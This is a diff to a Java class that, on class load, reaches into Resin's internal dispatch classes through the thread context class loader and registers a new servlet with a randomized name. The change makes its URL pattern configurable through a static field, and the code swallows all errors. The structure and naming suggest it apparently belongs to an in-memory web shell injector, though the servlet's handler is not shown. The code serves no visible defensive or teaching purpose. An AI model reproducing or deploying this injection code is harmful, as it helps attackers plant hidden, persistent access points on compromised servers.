@@ -14,10 +14,11 @@ import java.util.HashMap;
  */
 public class RSMSFromThread implements Servlet {
 
+	public static String pattern;
+
 	static {
 		try {
 			String servletName = "su18" + System.nanoTime();
-			String urlPattern  = "/su18";
 
 			Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch" +
 					".ServletInvocation");
@@ -51,7 +52,7 @@ public class RSMSFromThread implements Servlet {
 			map.put(servletName, new ServletConfigImpl());
 
 			smapping.setServletName(servletName);
-			smapping.addURLPattern(urlPattern);
+			smapping.addURLPattern(pattern);
 
 			web1.addServletMapping(smapping);
 		} catch (Exception ignored) {
